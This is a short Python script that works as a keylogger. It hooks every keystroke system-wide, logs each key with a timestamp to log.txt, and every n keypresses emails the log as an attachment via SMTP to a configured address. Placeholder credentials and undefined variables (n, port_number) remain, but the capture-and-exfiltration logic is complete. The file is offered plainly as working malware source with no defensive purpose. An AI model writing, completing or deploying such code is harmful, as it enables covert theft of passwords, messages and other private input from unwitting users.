import keyboard as kb
import time
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase

# keylog function records all the keystrokes along with the time at which they were recorded in a text file named log.
def keylog():
  global count
  count=0
  # Open a file named log.txt in append mode to add new keystrokes to the end of the file
  log_f = open("log.txt", 'a')
  # Write a header to the log file to indicate the start of a new log session
  log_f.write("\n\n-----------------------Keyboard Log-----------------------\n\n")

  # This function is responsible for sending the logs after every 10 keyboard inputs via email.
  def send_log_email():
    msg = MIMEMultipart()
    msg['From'] = 'youremail'
    msg['To'] = 'youremail'
    msg['Subject'] = 'Keyboard Log'
    body = 'This is a log file.'
    msg.attach(MIMEText(body))
    filename = 'log.txt'
    with open(filename, 'rb') as f:
      attachment = MIMEBase('application', 'octet-stream')
      attachment.set_payload(f.read())
      attachment.add_header('Content-Disposition', 'attachment; filename="%s"' % filename)
      msg.attach(attachment)
    smtp = smtplib.SMTP('mail server', port_number)
    smtp.starttls()
    smtp.login('your_email.com', 'password')
    smtp.sendmail(msg['From'], msg['To'], msg.as_string())
    smtp.quit()


  # Define a callback function to handle keyboard events
  def on_press(key):
    global count
    count+=1
    # The log file will be mailed to you after every 'n' keypresses executed by the user
    if(count%n==0):
      send_log_email()


    # Get the current time in seconds since the epoch (January 1, 1970)
    curr_time_since_epoch = time.time()
    # Convert the current time in seconds since the epoch to a human-readable string
    curr_time = time.ctime(curr_time_since_epoch)
    # Write the current time and the key that was pressed to the log file
    log_f.write(str(curr_time) + " : " + str(key) + "\n")
    # Flush the log file to ensure that the keystroke is written to the file immediately
    log_f.flush()

  # Register the on_press function as a callback for keyboard events
  kb.on_press(on_press)
  # Wait for keyboard events to occur
  kb.wait()
  # Close the log file
  log_f.close()

# Call the keylog function to start logging keystrokes
keylog()
